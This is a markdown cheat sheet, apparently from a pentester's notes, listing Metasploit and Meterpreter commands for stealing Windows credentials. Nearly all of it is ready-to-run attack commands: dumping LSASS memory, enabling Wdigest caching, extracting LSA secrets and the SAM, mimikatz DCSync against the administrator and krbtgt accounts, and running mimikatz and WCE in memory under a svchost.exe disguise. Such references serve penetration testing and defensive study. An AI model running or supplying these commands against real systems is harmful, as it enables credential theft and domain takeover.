# Metasploit

## 01 - Post Module

Dump the process memory.

```
msf > use post/windows/gather/memory_dump

msf post(windows/gather/memory_dump) > options 

Module options (post/windows/gather/memory_dump):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DUMP_PATH                      no        File to write memory dump to
   DUMP_TYPE     standard         yes       Minidump size (Accepted: standard, full)
   PID                            no        ID of the process to dump memory from
   PROCESS_NAME                   no        Name of the process(es) to dump memory from
   SESSION                        yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/memory_dump) > set process_name lsass.exe

msf post(windows/gather/memory_dump) > set pid <process_ID>

msf post(windows/gather/memory_dump) > set dump_type <standard | full>

msf post(windows/gather/memory_dump) > set dump_path "C:\\path\\to\directory\\"

msf post(windows/gather/memory_dump) > run
```

### 1.1 - Wdigest

```
meterpreter > run post/windows/manage/wdigest_caching

meterpreter > run post/windows/gather/credentials/sso
```

### 1.2 - LSA Secrets

```
meterpreter > run post/windows/gather/lsa_secrets
```

### 1.3 - LSASS Dump

```
meterpreter > run post/windows/gather/credentials/lsassy
```

## 02 - Interactive Session

### 2.1 - Dump All Creds

```
meterpreter > creds_all
```

### 2.2 - SAM

```
meterpreter > lsa_dump_sam
```

### 2.3 - Wdigest

```
meterpreter > creds_wdigest
```

### 2.4 - LiveSSP

```
meterpreter > creds_livessp
```

### 2.5 - MSV

```
meterpreter > creds_msv
```

### 2.6 - SSP

```
meterpreter > creds_ssp
```

### 2.7 - TSPKG

```
meterpreter > creds_tspkg
```

### 2.8 - Kiwi Commands

```
meterpreter > kiwi_cmd '"lsadump::dcsync /user:administrator"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:krbtgt"'

meterpreter > kiwi_cmd '"lsadump::dcsync /user:<username>"'
```

## 03 - Execute binary tools via memory

```
meterpreter > execute -Hicmd svchost.exe -f /home/user/wce.exe -a -w

meterpreter > execute -Hic -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -m -d svchost.exe

meterpreter > execute -Hicmd svchost.exe -f /home/user/mimikatz.exe -a '"sekurlsa::logonpasswords full" exit'
```

---
## References

### Hacking Articles

- [Hacking Articles: Metasploit for Pentester Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/)

- [Hacking Articles: Credential Dumping Wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)

### Astr0baby

- [Astr0baby: Running Latest x64 Mimikatz on Windows 10](https://astr0baby.wordpress.com/2018/01/30/running-latest-x64-mimikatz-on-windows-10/)

### Justinelze

- [Justinelze: WCE and Mimikatz in Memory over Meterpreter](https://justinelze.wordpress.com/2013/03/25/wce-and-mimikatz-in-memory-over-meterpreter/) 